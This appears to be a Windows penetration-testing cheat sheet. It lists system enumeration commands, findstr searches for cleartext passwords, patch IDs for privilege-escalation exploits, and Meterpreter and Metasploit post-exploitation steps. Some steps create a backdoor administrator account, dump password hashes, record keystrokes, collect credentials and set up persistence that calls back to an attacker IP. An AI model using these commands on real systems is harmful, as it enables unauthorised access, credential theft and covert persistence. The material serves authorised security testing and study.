# PENTESTING IN WINDOWS

Collection of commands used in pentesting process. 
Check references in the bottom of this file

## Enumeration of the System

```
# Basics
systeminfo
hostname

# Who am I?
whoami
echo %username%

# OS and service packs
systeminfo | findstr /B /C:”OS Name” /C:”OS Version”
ver

# What users are on the machine?
net users
net user Administrator

# What localgroups are on the machine?
net localgroups
net localgroups Administrators

# Create a user and add it to the Administrator localgroup
net user intruder Intr2020. /add
net localgroup Administrators intruder /add

# View Domain Groups
net group /domain

# View Members of Domain Group
net group /domain <Group Name>

# Check services
wmic service list brief

# Firewall
netsh firewall show state
netsh firewall show config

# Network
ipconfig /all
route print
arp -A

# Active Connections
netstat -ano

# How well patched is the system?
wmic qfe get Caption,Description,HotFixID,InstalledOn
```





## Search Cleartext Passwords

Searches for text patterns in files.

https://docs.microsoft.com/es-es/windows-server/administration/windows-commands/findstr

```
# Find passwords in all the files in C: without printing the password, useful against large configuration files
findstr /S /I /M "password" C:\*.*


# Find passwords in all the files in C:, will print the password and the line were is located
findstr /S /I /N "password" C:\*.txt


# Find passwords in all the files in user directory (be careful with AppData directory)
findstr /SINP "password" C:\Users\user\*.txt
```


## Privilege Escalation Exploits by Patch

Search this MS in MSFconsole there are public exploits to be used to

```
MS10-015

MS10-059

MS10-092

MS11-080

MS13-005

CVE-2013-3660

MS13-053

MS13-081

MS14-058

MS14-068

MS14-070

MS15-001

MS15-051

MS15-052

```

## Meterpreter

You need to have SESSION open with the victim using the meterpreter payload, preferably with SYSTEM privileges

```
# Check user
getuid

# Check process
getpid

# Tries to elevate privileges 
getsystem

# Dump hashes 
hashdump

# Enable RDP and open Firewall ports
run getgui -e 

# Creates persistence in the system when the user boot up the system or log in a session. Can be used with multi/handler
run persistence -U -X -i 60 -p <port> -r <attacker_ip>

# Creates a keystoke sniffer
run keylogrecorder
```


## Metasploit - Post Modules

You need to have SESSION open with the victim, preferably with SYSTEM privileges

```
use exploit/windows/local/service_permissions

post/windows/gather/credentials/gpp

run post/windows/gather/credential_collector 

run post/multi/recon/local_exploit_suggester

run post/windows/gather/enum_shares

run post/windows/gather/enum_snmp

run post/windows/gather/enum_applications

run post/windows/gather/enum_logged_on_users

run post/windows/gather/checkvm
```




# References

https://github.com/xapax/security/blob/master/privilege_escalation_windows.md

http://www.exumbraops.com/penetration-testing-102-windows-privilege-escalation-cheatsheet

https://www.windows-commandline.com/list-of-user-groups-command-line/
